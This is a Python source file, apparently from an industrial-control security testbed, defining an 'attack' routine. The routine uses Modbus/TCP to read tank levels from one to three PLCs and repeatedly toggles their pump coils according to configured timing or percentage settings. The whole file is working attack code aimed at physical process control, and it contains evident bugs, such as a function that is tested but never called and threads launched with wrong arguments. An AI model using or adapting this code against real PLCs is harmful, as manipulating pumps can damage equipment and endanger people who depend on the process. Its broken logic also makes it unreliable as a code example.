import time
import configparser
from pymodbus.client.sync import ModbusTcpClient
import time
import threading
from datetime import datetime

def attack(ctx):

    def pump(plc):
        increment = 1
        ct = 0
        ct_2 = 0
        status = "text"
        level_start = 0
        level_end = 0
        time_2_commands = 0
        limit = 0

        # Read from config.ini
        config = configparser.ConfigParser()
        config.read('config.ini')
        
        time_empty= int(config.get('params', 'time_empty'))
        time_empty = time_empty / 60

        if(config.get('params', 'time_send') == ""):
            mode = "percentage"
            percentage = int(config.get('params', 'percentage'))
            limit = int((100-percentage) /25)
        else:
            mode = "time_command"
            time_2_commands = int(config.get('params', 'time_send'))

        
        ip, port = plc.split(':')

        # Convert the port to an integer
        port = int(port)

        client = ModbusTcpClient(ip, port = port)
        client.connect()
        result = client.read_input_registers(0, count=1, unit=1)
        level_start = result.registers[0]
        print(level_start)
        time.sleep(2)
        result = client.read_input_registers(0, count=1, unit=1)
        level_end = result.registers[0] +1 #DA TOGLIERE +1
        print(level_end)
        if(level_start > level_end): # decreasing
            status = "dec"
        elif(level_start < level_end): # increasing
            status = "inc"
        else:
            status = "stopped"
        while(True):
            if status == "dec" :
                #apro la coil/pompa
                if checkTrigger:
                    # Trigger checked
                    # Call the function to evaluate conditions
                    all_conditions_true = evaluate_conditions(config)

                    # Perform an operation if all conditions are true
                    if all_conditions_true:
                        if mode == "time_command":
                            client.write_coil(0, 0, unit=1)
                            time.sleep(time_2_commands)
                            client.write_coil(0, 1, unit=1)
                        elif mode == "percentage":
                            if ct_2 < limit:
                                    ct_2 += 1
                            elif ct_2 >= limit and ct_2 < 4: 
                                ct_2 += 1
                                client.write_coil(0, 0, unit=1)
                            elif ct_2 >= 4 and percentage != 100:
                                ct_2 = 1
                            elif ct_2 >= 4 and percentage == 100:
                                ct_2 = 0
                                client.write_coil(0, 0, unit=1)
                    else:
                        # No triggers
                        if mode == "time_command":
                            client.write_coil(0, 0, unit=1)
                            time.sleep(time_2_commands)
                            client.write_coil(0, 1, unit=1)
                        elif mode == "percentage":
                            if ct_2 < limit:
                                    ct_2 += 1
                            elif ct_2 >= limit and ct_2 < 4: 
                                ct_2 += 1
                                client.write_coil(0, 0, unit=1)
                            elif ct_2 >= 4 and percentage != 100:
                                ct_2 = 1
                            elif ct_2 >= 4 and percentage == 100:
                                ct_2 = 0
                                client.write_coil(0, 0, unit=1)

            elif status == "inc":
                #chiudo la coil/pompa
                if checkTrigger:
                    # Trigger checked
                    # Call the function to evaluate conditions
                    all_conditions_true = evaluate_conditions(config)

                    # Perform an operation if all conditions are true
                    if mode == "time_command":
                            client.write_coil(0, 0, unit=1)
                            time.sleep(time_2_commands)
                            client.write_coil(0, 1, unit=1)
                    elif mode == "percentage":
                            if ct_2 < limit:
                                    ct_2 += 1
                            elif ct_2 >= limit and ct_2 < 4: 
                                ct_2 += 1
                                client.write_coil(0, 1, unit=1)
                            elif ct_2 >= 4 and percentage != 100:
                                ct_2 = 1
                            elif ct_2 >= 4 and percentage == 100:
                                ct_2 = 0
                                client.write_coil(0, 1, unit=1)
                else:
                    # No triggers
                    if mode == "time_command":
                            client.write_coil(0, 0, unit=1)
                            time.sleep(time_2_commands)
                            client.write_coil(0, 1, unit=1)
                    elif mode == "percentage":
                            if ct_2 < limit:
                                    ct_2 += 1
                            elif ct_2 >= limit and ct_2 < 4: 
                                ct_2 += 1
                                client.write_coil(0, 1, unit=1)
                            elif ct_2 >= 4 and percentage != 100:
                                ct_2 = 1
                            elif ct_2 >= 4 and percentage == 100:
                                ct_2 = 0
                                client.write_coil(0, 1, unit=1)
            
            # Get the current date and time
            current_datetime = datetime.now()

            # Format the datetime as a string with milliseconds
            timestamp = current_datetime.strftime("%Y-%m-%d %H:%M:%S.%f")


            result = client.read_input_registers(0, count=1, unit=1)
            level = result.registers[0]

            print(f"Level: {level}, Timestamp: {timestamp}")
            client.close()

    
    def checkTrigger(address):
        config = configparser.ConfigParser()
        config.read('config.ini')

        if 'params' in config:
            for param_name in config['params']:
                if param_name.startswith('condition'):
                    return True
        return False
    
    def evaluate_conditions(config):
        all_conditions_true = True
        for section_name in config.sections():
            for param_name, param_value in config[section_name].items():
                if param_name.startswith('condition'):
                    # Split the condition value into components
                    combined_ip, device, cond, value = param_value.split()

                    # Split the combined string into IP and port
                    ip, port = combined_ip.split(':')

                    # Convert the port to an integer
                    port = int(port)

                    # Determine the device type and number
                    device_type = device[0]
                    device_number = int(device[1:])

                    client = ModbusTcpClient(ip, port)
                    # Connect to the PLC
                    client.connect()

                    if device_type == 'c':
                        result = client.read_coils(device_number, 1, unit=1)
                        coil_value = bool(result.bits[0])  # Convert to boolean
                        print(f"Value of coil {device_number}: {coil_value}")

                        if coil_value == True:
                            coil_value = "ON"
                            value.upper()
                        else:
                            coil_value = "OFF"
                            value.upper()

                        if(cond == ">" or cond == "<"):
                            print("Condition error.")
                        elif(cond == "is"):
                            if(coil_value != value):
                                return False
                        elif(cond == "isnt"):
                            if(coil_value == value):
                                return False

                    elif device_type == "i":
                        result = client.read_input_registers(device_number, 1, unit=1)
                        if not result.isError() and len(result.registers) == 1:
                            input_register_value = int(result.registers[0])
                        else:
                            print(f"Error reading input register {device_number}")

                        value = int(value)

                        
                            

                    elif device_type == "m":
                        result = client.read_holding_registers(device_number+1024, 1, unit=1)
                        if not result.isError() and len(result.registers) == 1:
                            holding_register_value = int(result.registers[0])
                            print(f"Value of holding register {device_number}: {holding_register_value}")
                        else:
                            print(f"Error reading holding register {device_number}")

                        if(cond == ">"):
                            if(holding_register_value <= value):
                                return False
                        elif(cond == "<"):
                            if(holding_register_value >= value):
                                return False
                        else:
                            print("Condition error.")

                    else:
                        print(f"Unsupported device type: {device_type}")


                    client.close()

        return all_conditions_true

    # Read from config.ini
    config = configparser.ConfigParser()
    config.read('config.ini')

    plc_values = {}
    values = []

    for plc_key in config['plc']:
        plc_values[plc_key] = config.get('plc', plc_key)
        # Split the combined string into IP and port
        ip, port = plc_values[plc_key].split(':')

        # Convert the port to an integer
        port = int(port)

        client = ModbusTcpClient(ip, port = port)
        client.connect()
        result = client.read_input_registers(0, count=1, unit=1)
        values.append(result.registers[0])
        client.close()


    # PLC attack
    # ONE PLC selected
    if config.get('params', 'plc1_choice') != "" and (config.get('params', 'plc2_choice') == "" and config.get('params', 'plc3_choice') == ""):
        
        print("Attacking one plc...")
        pump(config.get('plc', 'plc1'))
        

    # TWO PLCs selected
    if config.get('params', 'plc1_choice') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') == "":
        print("Attacking two PLCs...")
        thread1 = threading.Thread(target=pump, args=(values[0], config.get('plc', 'plc1')))
        thread2 = threading.Thread(target=pump, args=(values[1], config.get('plc', 'plc2')))
        thread1.start()
        thread2.start()
        thread1.join()
        thread2.join()
    
    # THREE PLCs selected 
    if config.get('params', 'plc1_choice') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') != "":
        print("Attacking three plcs...")
        thread1 = threading.Thread(target=pump, args=(values[0], config.get('plc', 'plc1')))
        thread2 = threading.Thread(target=pump, args=(values[1], config.get('plc', 'plc2')))
        thread3 = threading.Thread(target=pump, args=(values[2], config.get('plc', 'plc3')))
        thread1.start()
        thread2.start()
        thread3.start()
        thread1.join()
        thread2.join()
        thread3.join()


